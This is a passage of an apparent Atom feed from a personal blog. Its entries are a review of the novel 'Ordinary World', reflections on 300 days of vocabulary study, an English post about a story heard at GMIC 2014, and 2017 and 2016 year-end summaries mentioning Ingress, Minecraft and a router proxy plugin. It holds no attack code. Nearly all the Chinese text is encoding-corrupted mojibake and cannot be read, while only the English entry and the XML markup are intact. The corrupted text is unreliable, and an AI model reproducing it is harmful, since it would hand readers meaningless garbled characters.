–çª‘ï¼Œæˆä¸ºå†’å°–æˆ·ã€‚</p><p>å°‘å¹³åŸæ¥åœ¨å¿åŸé«˜ä¸­è¯»ä¹¦ï¼Œæ¯•ä¸šåå›ä¹¡åšäº†ä¸€åè€å¸ˆï¼Œä½†ä»–æ²¡æœ‰æ¶ˆæ²‰ï¼Œä¸å¿é©å§”å‰¯ä¸»ä»»ç”°ç¦å†›å¥³å„¿ç”°æ™“éœå»ºç«‹äº†å‹æƒ…ï¼Œé’æ˜¥çš„æ¢¦æƒ³å’Œè¿½æ±‚ä¹Ÿæ¿€åŠ±ç€ä»–åˆ°å¤–é¢å»â€œé—¯è¡ä¸–ç•Œâ€ï¼Œä»–ä»æ¼‚æ³Šçš„æ½å·¥æ±‰æˆä¸ºæ­£å¼çš„å»ºç­‘å·¥äººï¼Œæœ€ååˆè·å¾—äº†å½“ç…¤çŸ¿å·¥äººçš„å¥½æœºé‡ï¼Œè€Œç”°æ™“éœæ¯•ä¸šåä¹Ÿåˆ°çœåŸæˆä¸ºäº†ä¸€åè®°è€…ã€‚åœ¨ä¸¤äººäº§ç”Ÿäº†å¼ºçƒˆçš„æ„Ÿæƒ…æ—¶å€™ï¼Œç”°æ™“éœå´å› åœ¨æŠ—æ´ªé‡‡è®¿ä¸­ä¸ºæŠ¢æ•‘ç¾æ°‘å…‰è£ç‰ºç‰²ï¼Œå°‘å¹³æ‚²ç—›ä¸å·²ã€‚åæ¥å°‘å¹³åœ¨ä¸€æ¬¡äº‹æ•…ä¸­æ¯å®¹ï¼Œä»–æ²¡æœ‰è¢«ä¸å¹¸å‹è·¨ï¼Œé‡æ–°å›åˆ°çŸ¿å±±è¿æ¥æ–°çš„æŒ‘æˆ˜ã€‚</p><h2><span id="ping-fan-de-shi-jie-li"><strong>å¹³å‡¡çš„ä¸–ç•Œé‡Œ</strong></span></h2><p>ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹æ˜¯ä¸€éƒ¨å¾ˆé•¿çš„å°è¯´ï¼Œä½†æ˜¯æ–‡å­—ååˆ†æµç•…ï¼Œå¾ˆå¿«å°±å¯ä»¥å¸¦å…¥æˆ‘ä»¬è¿›å…¥è¿™ä¸¤ä¸ªåœ¨é»„åœŸé«˜åŸä¸Šé—ªäº®çš„ä¸¤ä¸ªäººçš„æ•…äº‹ã€‚åœ¨é‚£ä¸ªæ—¶ä»£å˜é©æ˜æ˜¾çš„æ—¶ä»£ï¼Œä¸ªäººçš„å‘½è¿ä¹Ÿå’Œæ—¶ä»£çš„å‘½è¿ç´§ç´§åœ°è”ç³»åœ¨ä¸€èµ·ï¼Œä¸æ­¤åŒæ—¶ï¼Œä¸ªäººçš„è¿½æ±‚å’Œæ¢¦æƒ³ä¹Ÿåœ¨ä¸€æ­¥ä¸€æ­¥åœ°å½±å“è¿™ä»–ä»¬çš„è½¨è¿¹ã€‚å°‘å®‰çœ‹å‡†äº†æ—¶ä»£çš„å…ˆæœºï¼Œå°‘å¹³è¿½æ±‚ä¸ä¸€æ ·çš„å¤–é¢ä¸–ç•Œï¼Œè¿™ä¹Ÿæ·±æ·±åœ°å½±å“ä»–ä»¬çš„å‘½è¿å’Œæ„Ÿæƒ…ã€‚</p><p>ä»–ä»¬çš„æ„Ÿæƒ…éƒ½æœ‰ç€æ‚²å‰§æ€§çš„ä¸€é¢ã€‚å°‘å®‰ä¸ç”°æ¶¦å¶ï¼Œå°‘å¹³ä¸ç”°æ™“éœï¼Œæœ€ç»ˆæ²¡èƒ½åœ¨ä¸€èµ·ï¼Œç”šæ˜¯æƒ‹æƒœã€‚ä¹¦ä¸­åœ¨è®¸å¤šç»†èŠ‚ä¸Šçš„æå†™ä»¤äººæ„ŸåŠ¨ï¼Œæ¯”å¦‚å°‘å¹³ä¸å°‘å®‰ç›¸çº¦ä¸¤å¹´ä¹‹åå†ç›¸è§çš„é‚£æ®µï¼Œä»¥åŠå°‘å¹³åœ¨å¾—çŸ¥ç”°æ™“éœç‰ºç‰²ä¹‹åçš„æ„Ÿæƒ…å˜åŒ–ï¼Œè®©äººå¿ƒä¸­ä¸ºä¹‹è€ŒåŠ¨ã€‚</p><p>æˆ‘å–œæ¬¢ä¹¦ä¸­æåˆ°çš„å¶èµ›å®çš„ä¸€é¦–è¯—ï¼šä¸æƒ‹æƒœï¼Œä¸å‘¼å”¤ï¼Œæˆ‘ä¹Ÿä¸å•¼å“­â€¦â€¦é‡‘é»„çš„è½å¶å †æ»¡æˆ‘å¿ƒé—´ï¼Œæˆ‘å·²ç»ä¸å†æ˜¯é’æ˜¥å°‘å¹´â€¦â€¦</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ã€Šå¹³å‡¡çš„ä¸–ç•Œã€‹ä¸å¹³å‡¡çš„ä¸–ç•Œ
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>æ‰‡è´300å¤©å°è®°ï¼šåšæŒçš„åŠ›é‡</title>
    <link href="https://qiwihui.com/qiwihui-blog-9/"/>
    <id>https://qiwihui.com/qiwihui-blog-9/</id>
    <published>2018-10-09T05:25:12.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ°ä»Šå¤©ï¼Œæˆ‘å·²ç»åœ¨<a href="http://www.shanbay.com">æ‰‡è´</a>ç½‘ä¸Šå®Œæˆäº†300+å¤©çš„èƒŒå•è¯å’Œé˜…è¯»æ–‡ç« , å•è¯é‡è™½ç„¶ä¸ç®—å¾ˆå¤šï¼Œä½†æ˜¯åœ¨è¿™è¿‡ç¨‹ä¸­çš„æ„Ÿæƒ³è¿˜æ˜¯å€¼å¾—åˆ†äº«çš„ã€‚</p><span id="more"></span><p>æˆ‘å–œæ¬¢é“å®¶ä¹‹æ•°â€œä¸‰â€ï¼Œé“å®¶æ›°ï¼šä¸€ç”ŸäºŒï¼ŒäºŒç”Ÿä¸‰ï¼Œä¸‰ç”Ÿä¸‡ç‰©ã€‚å¤©ä¸‹ä¹‹äº‹æƒ…æœ‰ä¸‰è€Œç”Ÿï¼Œå³æ˜¯åˆšåˆšå¼€å§‹ï¼Œæ•…è€Œåœ¨300å¤©å·¦å³çš„æ—¶å€™æ˜¯å¾ˆé€‚åˆåˆ†äº«çš„ã€‚</p><h2><span id="qi-yin-he-jian-chi-de-dong-li"><strong>èµ·å› å’ŒåšæŒçš„åŠ¨åŠ›</strong></span></h2><p>èƒŒå•è¯çš„æœ€åˆèµ·å› é‡Œå¸¦æœ‰ç§æ„¤ï¼Œæ°”æ„¤ï¼Œå¤§ä½“å°±æ˜¯æˆä¸ºå‰å¥³å‹çœ¼ä¸­çš„â€œæå“å‰ä»»â€ã€‚è™½ç„¶è¿™åœ¨æœ€å‡ºçš„å‡ å¤©å¾ˆæ¿€åŠ±ï¼Œä½†æ˜¯è¿™ç§æ„Ÿè§‰å¾ˆå¿«å°±æ¶ˆå¤±äº†ï¼Œä¹‹é—´æœ‰ä¸€æ®µè¿·èŒ«æœŸï¼Œä¸çŸ¥åˆ°è‡ªå·±ä¸ºä»€ä¹ˆèƒŒå•è¯ã€‚ç›´åˆ°æœ‰ä¸€å¤©æˆ‘æ‰¾åˆ°äº†å¦ä¸€ç§åšæŒï¼Œä¸€ä¸ªè‡ªå·±ä¸€ç›´æƒ³å»çš„åœ°æ–¹ï¼šMultnomah Fallsï¼Œè¿™æ˜¯åœ¨ç¾å›½Oregonè¿™å·çš„ä¸€ä¸ªç€‘å¸ƒï¼Œæˆ‘è¢«å¥¹ç»šä¸½çš„è½å·®æ‰€æŠ˜æœï¼Œæœ‰ç”Ÿä¹‹å¹´ä¸ç„¶æ˜¯è¦å‰å¾€çš„ï¼Œè™½ç„¶è§‰å¾—å»æ—…æ¸¸å’ŒèƒŒå•è¯ä¸æ˜¯å¾ˆæ­è¾¹ï¼Œæ²¡ä»€ä¹ˆè”ç³»ã€‚</p><p>å°±æ˜¯è¿™ä¸ªï¼ŒçŠ¹å¦‚åœ¨è¿œæ–¹ç­‰å¾…ç€æˆ‘çš„å°‘å¥³ï¼Œè®©æˆ‘åšæŒåˆ°äº†ç°åœ¨ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/45277890-077a9600-b4fd-11e8-936b-5e6e4d6f98a5.jpg" alt="06-multnomahfalls"></p><h2><span id="fang-fa"><strong>æ–¹æ³•</strong></span></h2><p>æ‰‡è´ç½‘æ˜¯æˆ‘çŸ¥é“çš„ä¸ºæ•°ä¸å¤šçš„å‡ ä¸ªèƒŒå•è¯çš„ç½‘ç«™ï¼Œé™¤äº†å•è¯ï¼Œè¿˜æœ‰æ–°é—»æ–‡ç« ï¼Œä¹¦ç±ï¼Œä»¥åŠä¸€èµ·èƒŒå•è¯çš„å°ç»„å’Œè®ºå›ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ¿€åŠ±ç€ä½ ä¸€ç›´åšæŒèƒŒä¸‹å»ï¼Œå°ç»„çš„ä½œç”¨æ›´åŠ çš„æ˜æ˜¾ï¼Œä¸æ‰“å¡å°±è¸¢äººçš„åˆ¶åº¦å¾ˆåˆé€‚ã€‚å¯¹å•è¯çš„å•è¯çš„ç†è§£ç¨‹åº¦ä¹Ÿå®Œå…¨é è‡ªå·±çš„è‡ªè§‰ã€‚</p><h2><span id="gan-shou"><strong>æ„Ÿå—</strong></span></h2><p>èƒŒå•è¯æœ€å¤§çš„æ„Ÿå—æ˜¯ä½ ä¸èƒ½åªèƒŒå•è¯ï¼ŒåªèƒŒå•è¯å¦‚åŒåš¼èœ¡ï¼Œåˆšå¼€å§‹å°±ä¼šè§‰å¾—å¾ˆèˆ’æœï¼Œæ²¡æœ‰è¥å…»åˆæŸå®³èº«ä½“ï¼Œå¸¦æ¥çš„æ•ˆæœä¹Ÿå¾ˆå°ã€‚å•è¯èƒŒçš„åŒæ—¶ç»“åˆç€æ–‡ç« çš„é˜…è¯»æ•ˆæœæ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œä»¥å‰è€å¸ˆå¸¸è¯´çš„åœ¨è¯­å¢ƒä¸­ç†è§£å•è¯çš„å«ä¹‰å•ä½“å°±æ˜¯è¿™ä¸ªæ„æ€ã€‚å…¶æ¬¡æ˜¯è¦è®©è‡ªå·±å¤„åœ¨ä¸€ç§è‹±è¯­çš„æ°›å›´ä¸­ï¼Œå¯ä»¥ç”¨è‹±è¯­é˜…è¯»å†™æ–‡ç« ï¼Œä½¿ç”¨è‹±æ–‡å’Œæœ‹å‹äº¤æµï¼Œä½¿ç”¨è‹±æ–‡çš„åŠå…¬ç¯å¢ƒâ€¦å¦‚æ­¤ç§ç§ï¼Œéƒ½æ˜¯å¾ˆæœ‰æ•ˆæœçš„ã€‚å†è€…ï¼Œåˆ«äººå’Œè‡ªå·±çš„ç»éªŒå‘Šè¯‰æˆ‘ï¼šèƒŒå•è¯åº”è¯¥æ˜¯æ„è§å¾ˆå¿«ä¹çš„äº‹æƒ…ï¼Œå¦‚æœåœ¨è¿™ä¸ªè¿‡ç¨‹è¿‡ç¨‹ä¸­è§‰å¾—å¾ˆç—›è‹¦ï¼Œé‚£ä¹ˆæ˜¯åº”è¯¥è€ƒè™‘ä¸€ä¸‹è‡ªå·±çš„æ–¹æ³•äº†ã€‚</p><p>æç¬‘æ¥åœ¨ã€ŠæŠŠæ—¶é—´å½“ä½œæœ‹å‹ä¸­ã€‹ä¸­æåˆ°äº†èƒŒå•è¯çš„æ–¹æ³•ï¼š</p><blockquote><p>åœ¨èƒŒå•è¯çš„æ—¶å€™ï¼Œäº‹å®ä¸Šï¼Œåœ¨åšæ‰€æœ‰ç±»ä¼¼çš„å¿…é¡»è®°ä½å¤§é‡ä¿¡æ¯çš„å·¥ä½œçš„æ—¶å€™ï¼Œä¸€å®šè¦æƒ³åŠæ³•ç”±è¡·åœ°æŠŠè¿™ä»¶äº‹å½“æˆä¸€ä»¶å¿«ä¹çš„äº‹æƒ…æ¥åšã€‚</p><p>æˆ‘çš„ä¸€ä¸ªæœ‹å‹æ›¾è·Ÿæˆ‘åˆ†äº«ä»–çš„åšæ³•ï¼šå½“å¹´ä»–ç»ˆäºææ˜ç™½è¦æ‹¿åˆ°å¥–å­¦é‡‘å°±å¾—è·å¾—GREé«˜åˆ†çš„æ—¶å€™ï¼ŒèƒŒå•è¯é‡è¦æ±‚å“äº†ä¸€è·³ã€‚ä»–è¯´ï¼Œä»–ç”¨ä¸¤å¤©æ‰è¯´æœè‡ªå·±è¿™åº”è¯¥æ˜¯ä»¶å¿«ä¹çš„äº‹æƒ…ã€‚</p><p>ä¸€å…±è¦æå®š20000ä¸ªå•è¯ï¼Œè€Œå› æ­¤å¯èƒ½è·å¾—çš„å¥–å­¦é‡‘æ˜¯40000ç¾å…ƒå·¦å³ ä¸”è¿ç»­4å¹´æ²¡æœ‰å¤±ä¸šçš„å¯èƒ½ï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯å°±å€¼20å…ƒäººæ°‘å¸ï¼Œè¿™è¿˜åªä¸è¿‡æ˜¯ç®—äº†ä¸€å¹´çš„æ”¶å…¥è€Œå·²ã€‚</p><p>æ‰€ä»¥ï¼Œä»–ç»ˆäºæ˜ç™½èƒŒå•è¯æ˜¯å¾ˆå¿«ä¹çš„ï¼Œä»–æ¯å¤©éƒ½å¼ºè¿«è‡ªå·±èƒŒä¸‹200ä¸ªå•è¯ï¼Œæ¯åœ¨ç¡®å®šè®°ä½äº†ä¸€ä¸ªå•è¯å‰é¢ç”»ä¸Šä¸€ä¸ªå‹¾æ—¶ï¼Œä»–å°±æƒ³è±¡ä¸€ä¸‹åˆšåˆšæ•°è¿‡ä¸€å¼ 20å…ƒäººæ°‘å¸çš„é’ç¥¨ã€‚æ¯å¤©ç¡è§‰çš„æ—¶å€™æ€»æ„Ÿè§‰å¿ƒæ»¡æ„è¶³ï¼Œå› ä¸ºä»Šå¤©åˆèµšäº†4000å—ï¼</p></blockquote><p>åœ¨è¿™æ ·çš„åšæŒäº†300+å¤©ä»¥åï¼Œæˆ‘è§‰å¾—åœ¨æ›´å¤šçš„åœ°æ–¹éƒ½ä½“ä¼šåˆ°äº†ä¸€ä¸ªåšæŒåŠ›é‡ï¼ˆå¾ˆé¸¡æ±¤çš„ä¸€å¥è¯ï¼‰ï¼Œä½†æ˜¯ç¡®å®æ˜¯ï¼ŒåšæŒé”»ç‚¼ï¼Œæˆ–è€…å¼€å§‹æ¯å¤©/æ¯ä¸¤å¤©æ›´æ–°ä¸€åƒå­—åšå®¢ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      æ‰‡è´300å¤©å°è®°ï¼šåšæŒçš„åŠ›é‡
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>One small story by Fan Zhang at GMIC 2014</title>
    <link href="https://qiwihui.com/qiwihui-blog-8/"/>
    <id>https://qiwihui.com/qiwihui-blog-8/</id>
    <published>2018-10-09T05:23:57.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>I attended GMIC 2014 in Beijing at May 5<sup>th</sup> and May 6<sup>th</sup>.GMIC is short for Global Mobile Internet Conference, and it is a really huge conference.I just want to share a small story I heard in the conference.</p><span id="more"></span><h2><span id="0x00"><strong>0x00</strong></span></h2><p>In WeTalk Stage, one of the 8 stages, Fan Zhang, who is the brain behind<a href="http://en.wikipedia.org/wiki/Midi_Music_Festival">Midi Modern Music Festival</a>, gave us a speech: Listen to the Original Where Music is Eternal.In the speech, he shared us a song named â€œThe Brightest Star in the Skyâ€ of 2013 Shanghai Midi Festival(watch it <a href="https://www.youtube.com/watch?v=Z7qgMJCmAHs">here</a>), and told us a story about the boywho was singing with tears at 2:31 in the video.</p><iframe width="560" height="315" src="//www.youtube.com/embed/Z7qgMJCmAHs" frameborder="0" allowfullscreen></iframe><p>The boy met his girlfriend when they are student in college,but they got separated after graduation and went back to their own hometown. It was the first time they saw each otherafter 2 years. When catching this song, the boy couldnâ€™t stop crying with mixed feeling.</p><p>This is what music means that something in your deep heart and express your real feeling, I think.</p><p>I would like to go to Midi festival the next time in Beijing, and listen to this song.</p><h2><span id="0x01"><strong>0x01</strong></span></h2><p><a href="http://smileboxx.blogspot.com/2013/08/escape-plan-brightest-star-in-night-sky.html">Here</a> is the song&quot;The Brightest Star in the Sky&quot; in English. Hope you like it.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      One small story by Fan Zhang at GMIC 2014
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - 2017å¹´</title>
    <link href="https://qiwihui.com/qiwihui-blog-7/"/>
    <id>https://qiwihui.com/qiwihui-blog-7/</id>
    <published>2018-10-09T05:21:40.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>å·¥ä½œ:</p><ul><li><p>å®‰å…¨æ–¹å‘ï¼›</p></li><li><p>å¤§æ•°æ®ï¼›</p></li><li><p>æœºå™¨å­¦ä¹ åˆå­¦ï¼šçº¿æ€§å›å½’ï¼Œç¥ç»ç½‘è·¯ï¼ŒSVMï¼›</p></li><li><p>æ·±åº¦å­¦ä¹ å…¥é—¨</p></li><li><p>è¯­è¨€ï¼šPython, iOS, Go</p></li><li><p>é˜…è¯»/è¯»ä¹¦ï¼šéæŠ€æœ¯çš„ä¹¦é˜…è¯»è¾ƒå°‘ï¼Œäº”æœ¬å·¦å³</p></li><li><p>çŸ¥è¯†æ•´ç†ç³»ç»Ÿï¼šRSS, PinBoard -&gt; Pocket -&gt; IFTTT -&gt; Evernoteè®°å½•ï¼Œgithubåˆ†æ</p></li><li><p>å¼€æºé¡¹ç›®ï¼Œç»´æŠ¤ä¹åŠ›ï¼Œhiwifi-ss</p></li><li><p>æˆ‘çš„ä¸“é•¿ï¼š</p><ul><li>æ•°å­¦åŸºç¡€ï¼šæœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ æœ‰å¤©ç„¶çš„ä¼˜åŠ¿</li><li>æˆ‘çš„å¼±ç‚¹ï¼šå¯¹äºåšäº‹æƒ…çš„çƒ­åº¦ä¸å¤ŸæŒä¹…=&gt; åˆ©ç”¨è¿™ç‚¹ï¼Œæ¯ç§å­¦ä¸€æ®µï¼Œäº¤æ›¿è¿›è¡Œ</li><li>æƒ…ç»ªç®¡ç†ï¼šæ— æ³•æ§åˆ¶è‡ªå·±çš„æƒ…ç»ªå¯¹äºè‡ªå·±å·¥ä½œçš„å½±å“ï¼Œä¸€åº¦ä¸çŸ¥é“æ€ä¹ˆæ§åˆ¶è‡ªå·±</li></ul></li></ul><p>ç›®æ ‡ï¼š</p><ul><li>ç½‘è·¯è‡ªç”±åŒ–å’Œå®‰å…¨åŒ–ï¼šRSSï¼Œç¿»å¢™ï¼Œå»ä¸­å¿ƒåŒ–è¿åŠ¨ï¼Œç½‘ç»œä¸­ç«‹</li></ul><p>äº§å“å’Œå®ç°</p><ol><li>æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ </li><li>Python</li><li>iOS, macOSå¼€å‘</li><li>æ¶æ„</li><li>ç”Ÿæ´»ï¼šè‡ªæˆ‘è®¤çŸ¥ï¼Œæ‹çˆ±ï¼Œæƒ°æ€§</li><li>æƒ…ç»ªå½±å“å·¥ä½œ</li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¹´åº¦æ€»ç»“ - 2017å¹´
    
    </summary>
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="ç”Ÿæ´»" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="æ€»ç»“" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>å¹´åº¦æ€»ç»“ - 2016å¹´ï¼Œæ˜¯å¿™ç¢Œè€Œæ— çŸ¥çš„ä¸€å¹´</title>
    <link href="https://qiwihui.com/qiwihui-blog-6/"/>
    <id>https://qiwihui.com/qiwihui-blog-6/</id>
    <published>2018-10-09T05:21:03.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>2016å¹´æ˜¯æ¯•ä¸šåè§‰å¾—è¿‡å¾—æœ€å¿«çš„ä¸€å¹´ï¼Œä¹Ÿæ˜¯è‡³ä»Šè§‰å¾—è¿‡å¾—æœ€å¿«çš„ä¸€å¹´ã€‚å› ä¸º&quot;å¿™ç¢Œ&quot;å’Œæ²¡æœ‰æ€è€ƒï¼Œæˆ‘åœ¨è¿™ä¸€å¹´è¿‡å¾—æ²¡æœ‰ç›®æ ‡ï¼Œæ²¡æœ‰è®¡åˆ’ã€‚</p><span id="more"></span><h2><span id="ingress-he-minecraft">Ingress å’Œ Minecraft</span></h2><p>2016å¹´ä¸»è¦ç©äº†ä¸¤æ¬¾æ¸¸æˆï¼šIngress å’Œ Minecraftï¼ˆæˆ‘çš„ä¸–ç•Œï¼‰ã€‚åœ¨Ingressä¸ŠèŠ±è´¹äº†å¾ˆå¤šçš„å¤œæ™šæ—¶é—´ï¼Œåœ¨ Minecraft ä¸ŠèŠ±è´¹äº†ä¸€äº›å‘¨æœ«æ—¶é—´ã€‚</p><h3><span id="ingress">Ingress</span></h3><p>å…¥å‘ Ingress å·²ç»å››å¹´ï¼Œä»Šå¹´é‡æ–°æ¡èµ·ï¼Œä»7æœˆåˆ°11æœˆï¼Œæˆ‘ç”¨äº†äº”ä¸ªæœˆçš„æ—¶é—´ä»åŸæ¥çš„8çº§å‡åˆ°äº†16çº§ï¼ˆæ¸¸æˆç­‰çº§ä¸Šçº¿ï¼‰ï¼Œæ—¶é—´æ˜¯2016å¹´11æœˆ30æ—¥23ç‚¹58åˆ†ï¼Œæ€»è®¡4ï¼Œ0000ï¼Œ000APã€‚16çº§ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªå¿µå¤´æ˜¯ï¼š<strong>Never Again</strong>ï¼Œæˆ‘å†ä¹Ÿä¸èƒ½16çº§äº†ï¼Œå¯èƒ½å†ä¹Ÿä¸ä¼šåŠå¤œä¸¤ä¸‰ç‚¹ä»ç„¶åœ¨è·¯ä¸Šæ´»åŠ¨ï¼Œå¯èƒ½å†ä¹Ÿä¸ä¼šå†»æ‰‹å†»è„šåœ°åœ¨å¯’é£ä¸­ç”»å›¾ï¼Œå¯èƒ½å†ä¹Ÿå¥”æ³¢å‡ åå…¬é‡Œå»è¿ä¸€æ¡ linkï¼Œå¯èƒ½å†ä¹Ÿä¸ä¼šæœˆèµ°è·¯330kmâ€¦ ä½†ä¾æ—§ä¼šå’Œé˜Ÿå‹ä¸€èµ·åšåˆ·ä»»åŠ¡ï¼Œåšå¤šé‡ã€‚æ¯ä¸€æ¬¡å‡çº§ï¼Œéƒ½æ˜¯ä¸€æ¬¡never again äº‹æƒ…ï¼Œä½†æ˜¯è¿™ä¸€æ¬¡çœŸçš„å°±never again äº†ã€‚Ingress çš„æ¸¸æˆç»å†å›æƒ³è¿‡æ¥ä¹Ÿæ˜¯åƒç”µå½±ä¸€æ ·ï¼šå…¥å‘ï¼Œæ‘¸ç´¢ï¼Œæ¸ç†Ÿï¼ŒAFKï¼Œå½’æ¥ï¼Œé‡æ‹¾ï¼Œèå…¥ï¼Œç–¯ç‹‚ï¼Œæœ€åå½’äºå¹³é™ã€‚ä¹Ÿè®¸ä¹‹åå›æƒ³èµ·æ¥è¿™ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿä¼šæ„Ÿå¹ä¸€å¥ï¼šä¹Ÿæ›¾ç»ç–¯ç‹‚è¿‡ã€‚</p><p>P.S. åŒä¸€ä¸ªå·å¯ä»¥è½¬é˜µè¥é‡ç½®è€Œå†æ¬¡16çº§ï¼Œä½†æ˜¯ï¼Œä½ æ„¿æ„èƒŒå¼ƒè‡ªå·±çš„ä¿¡ä»°ä¹ˆï¼Ÿ</p><h3><span id="minecraft">Minecraft</span></h3><p>æˆ‘çš„ä¸–ç•Œå¾ˆè‡ªç”±ï¼Œæ‰€æœ‰çš„ä¸œè¥¿éƒ½å¯ä»¥è‡ªå·±æ„å»ºï¼Œå› æ­¤ä¸–ç•Œåªé™åˆ¶äºæƒ³è±¡åŠ›ã€‚è‡ªå·±ç»´æŠ¤äº†ä¸€ä¸ª Minecraft çš„æœåŠ¡å™¨ï¼Œå’Œæœ‹å‹å…±åŒå»ºè®¾äº†ä¸€ä¸ªä¸–ç•Œã€‚</p><h2><span id="kai-yuan-xiang-mu-gong-xian">å¼€æºé¡¹ç›®è´¡çŒ®</span></h2><h3><span id="hiwifi-ss">hiwifi-ss</span></h3><p>æˆ‘åœ¨8æœˆ1å·å¼€å§‹ç»´æŠ¤å¼€æºé¡¹ç›®ï¼š<a href="https://github.com/qiwihui/hiwifi-ss">hiwifi-ss</a>, è¿™æ˜¯ä¸€ä¸ªåŸºäºå‰äººå·¥ä½œåšçš„æè·¯ç”±ç¿»å¢™æ’ä»¶ï¼Œä¸»è¦å®Œæˆäº†åœ¨æ–°ç‰ˆæœ¬æè·¯ç”±ä¸Šçš„ç•Œé¢æ›´æ–°å’ŒåŠŸèƒ½ä¿®å¤ã€‚å› ä¸ºå·¥ä½œå’Œ Ingress çš„åŸå› ï¼Œè¿™ä¸ªé¡¹ç›®åœ¨10æœˆåº•å°±æš‚æ—¶æ²¡æœ‰ç»§ç»­ç»´æŠ¤äº†ã€‚</p><p>è¿˜æƒ³åšä¸€äº›å…¶ä»–çš„é¡¹ç›®å’Œå®ç°ä¸€äº›å…¶ä»–çš„æƒ³æ³•ï¼Œæ¯”å¦‚ä¸€ä¸ªRSSåœ¨çº¿é˜…è¯»å™¨ã€‚</p><h2><span id="xue-xi">å­¦ä¹ </span></h2><h3><span id="ji-neng">æŠ€èƒ½</span></h3><p>2016å¹´ç¼ºä¹ç³»ç»Ÿåœ°å­¦ä¹ ã€‚ä¹‹å‰è·å–å’Œè®°å½•çŸ¥è¯†çš„è¿‡ç¨‹ï¼ˆä¹¦ï¼ŒRSS, åšå®¢ç­‰ -&gt; Pocketæš‚å­˜ -&gt; Evernoteè®°å½•å’Œå½’çº³ -&gt; åšæ–‡è¾“å‡ºï¼‰å¹¶æ²¡æœ‰å¾ˆå¥½çš„å®è¡Œå’Œä¿æŒï¼Œä½¿å¾—ä»£ç è™½ç„¶ä¼šå†™ï¼Œä½†æ˜¯æ²¡æœ‰ç³»ç»Ÿåœ°å»ç†è§£ä¸ºä»€ä¹ˆï¼Œæ²¡æœ‰å»ç†è§£æ€æ ·æ›´å¥½ã€‚æ‹¿æ¬ç –æ¥è®²ï¼Œåªæ˜¯å›å’å¢™ï¼Œè¿˜æ²¡æœ‰ä¸Šå‡åˆ°é€ æˆ¿å­æˆ–è€…é€ æ›´å¥½çš„æˆ¿å­çš„ç¨‹åº¦ã€‚</p><h3><span id="du-shu">è¯»ä¹¦</span></h3><p>ä»Šå¹´æ²¡æœ‰è¯»å¤ªå¤šçš„ä¹¦ï¼Œå‡†ç¡®è¯´å¾ˆå°‘ï¼Œä»¥è‡³äºåœ¨æœ€è¿‘çš„ä¸€æ®µæ—¶é—´æ˜æ˜¾æ„Ÿè§‰åˆ°ç²—å£å¢åŠ ï¼Œæ€è€ƒè¿·èŒ«ã€‚çœ‹çš„æ–‡ç« å¾ˆç¢ï¼Œè€Œä¸”æ²¡æœ‰åŠæ—¶æ€è€ƒï¼Œä½¿å¾—è¿™ä¸€å¹´æ²¡æœ‰å¤ªå¤šçš„æ€æƒ³æ”¶å…¥ã€‚</p><h3><span id="ying-yu-ri-yu">è‹±è¯­ã€æ—¥è¯­</span></h3><p>æœ€è¿‘ä¸€æ®µæ—¶é—´çš„è‹±è¯­å­¦ä¹ è´¨é‡ä¹Ÿæ˜æ˜¾ä¸‹é™ï¼Œå¤šæ¬¡ä»»åŠ¡æ²¡æœ‰è®¤çœŸåŠæ—¶å®Œæˆï¼Œæ€»ä½“æ„Ÿè§‰èƒ½åŠ›æ²¡æœ‰æå‡ã€‚æ—¥è¯­å­¦ä¹ ä¸­æ–­ï¼Œåœæ»ä¸å‰ã€‚</p><h2><span id="sheng-huo">ç”Ÿæ´»</span></h2><p>ç”Ÿæ´»ä¾æ—§æ˜¯ç”Ÿæ´»ã€‚</p><h3><span id="ye">å¤œ</span></h3><p>ä»Šå¹´å–œæ¬¢ä¸Šäº†æ˜Ÿæ˜Ÿï¼Œå¾ˆå¤šæ—¶é—´åœ¨æ™šä¸Šæ´»åŠ¨ï¼Œå¾ˆå¤šæ—¶å€™ç†¬å¤œåˆ°å¾ˆæ™šä¸è‚¯ç¡ã€‚å…¶å®è¿™ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¸å¯¹ã€‚åªæ˜¯å¦‚æ— 